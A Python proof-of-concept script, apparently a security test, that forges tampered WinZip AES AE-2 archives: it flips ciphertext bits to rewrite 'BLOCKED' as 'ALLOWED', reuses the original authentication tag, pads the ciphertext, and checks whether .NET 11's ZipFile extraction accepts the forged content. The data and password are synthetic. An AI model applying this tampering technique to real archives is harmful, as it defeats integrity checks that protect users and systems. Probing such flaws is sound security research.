#!/usr/bin/env python3
"""Controlled WinZip AES AE-2 authentication test against .NET 11; no third-party archives."""
import hashlib, hmac, json, os, pathlib, shutil, struct, subprocess, tempfile, zlib

ROOT=pathlib.Path(tempfile.mkdtemp(prefix="winzip-boundary-"))
OUT=pathlib.Path(os.environ.get("BOUNDARY_OUTPUT","."))
OUT.mkdir(parents=True,exist_ok=True)
PASSWORD=b"test-only-password"
OLD=b"status=BLOCKED"
NEW=b"status=ALLOWED"
PLAIN=b"Lab document: "+OLD+b"; no confidential data\n"
COMP=zlib.compressobj(level=0,wbits=-15)
DEFLATE=COMP.compress(PLAIN)+COMP.flush()
assert OLD in DEFLATE and len(OLD)==len(NEW)
salt=bytes.fromhex("00112233445566778899aabbccddeeff")
derived=hashlib.pbkdf2_hmac("sha1",PASSWORD,salt,1000,66)
enc_key, auth_key, pw_check=derived[:32],derived[32:64],derived[64:]
def aes_keystream(n):
    blocks=(n+15)//16
    counters=b"".join(struct.pack("<I",i)+b"\x00"*12 for i in range(1,blocks+1))
    p=subprocess.run(["openssl","enc","-aes-256-ecb","-K",enc_key.hex(),"-nosalt","-nopad"],
                     input=counters,stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
    return p.stdout[:n]
mask=aes_keystream(len(DEFLATE))
cipher=bytes(x^y for x,y in zip(DEFLATE,mask))
base_tag=hmac.new(auth_key,cipher,hashlib.sha1).digest()[:10]
pos=DEFLATE.find(OLD)
altered=bytearray(cipher)
for i,(o,n) in enumerate(zip(OLD,NEW)): altered[pos+i]^=o^n
assert altered!=cipher

def make_zip(name,ciphertext,tag):
    fname=b"probe.txt"
    extra=struct.pack("<HHH2sBH",0x9901,7,2,b"AE",3,8)
    size=16+2+len(ciphertext)+10
    local=struct.pack("<IHHHHHIIIHH",0x04034b50,51,1,99,0,0,0,size,len(PLAIN),len(fname),len(extra))+fname+extra
    data=salt+pw_check+ciphertext+tag
    offset=0
    central=struct.pack("<IHHHHHHIIIHHHHHII",0x02014b50,51,51,1,99,0,0,0,size,len(PLAIN),
                        len(fname),len(extra),0,0,0,0,offset)+fname+extra
    eocd=struct.pack("<IHHHHIIH",0x06054b50,0,0,1,1,len(central),len(local)+len(data),0)
    path=ROOT/name
    path.write_bytes(local+data+central+eocd)
    return path
make_zip("valid.zip",cipher,base_tag)
make_zip("tampered-no-tail.zip",bytes(altered),base_tag)
# Padding added to the declared AES ciphertext region, not to the decompressed content.
make_zip("tampered-with-early-deflate-eof.zip",bytes(altered)+b"\xa5"*131072,base_tag)

proj=ROOT/"zipprobe"
proj.mkdir()
(proj/"zipprobe.csproj").write_text('<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>net11.0</TargetFramework></PropertyGroup></Project>')
(proj/"Program.cs").write_text(r"""
using System;
using System.IO;
using System.IO.Compression;
using System.Text.Json;
var source = args[0];
var dest = args[1];
Directory.CreateDirectory(dest);
var record = new System.Collections.Generic.Dictionary<string,object?> { ["source"] = Path.GetFileName(source) };
try {
    ZipFile.ExtractToDirectory(source, dest, new ZipExtractionOptions { Password = "test-only-password".AsMemory(), OverwriteFiles = true });
    record["accepted"] = true;
    record["plaintext"] = File.Exists(Path.Combine(dest, "probe.txt")) ? File.ReadAllText(Path.Combine(dest, "probe.txt")).Trim() : "<missing>";
} catch (Exception e) {
    record["accepted"] = false;
    record["exception_type"] = e.GetType().Name;
    record["message"] = e.Message;
}
Console.WriteLine(JsonSerializer.Serialize(record));
""")
res=subprocess.run(["dotnet","restore",str(proj/"zipprobe.csproj"),"--ignore-failed-sources"],cwd=ROOT,text=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=130)
tests=[]
for name in ["valid.zip","tampered-no-tail.zip","tampered-with-early-deflate-eof.zip"]:
    if res.returncode!=0:
        tests.append({"source":name,"setup_error":res.stdout[-1400:]})
        continue
    r=subprocess.run(["dotnet","run","--no-restore","--project",str(proj/"zipprobe.csproj"),"--",
                      str(ROOT/name),str(ROOT/(name+".out"))],
                     cwd=ROOT,text=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=130)
    try: o=json.loads(r.stdout.strip().splitlines()[-1])
    except: o={"source":name,"runner_exit":r.returncode,"runner_log":r.stdout[-1000:]}
    tests.append(o)
report={"sdk":subprocess.run(["dotnet","--version"],capture_output=True,text=True).stdout.strip(),
        "tests":tests,"original_plaintext":PLAIN.decode().strip(),
        "expected_modified_plaintext":PLAIN.replace(OLD,NEW).decode().strip(),
        "used_synthetic_archive":True}
(OUT/"winzip-aes-results.json").write_text(json.dumps(report,indent=2))
for t in tests: print(t)
print("WROTE",OUT/"winzip-aes-results.json")
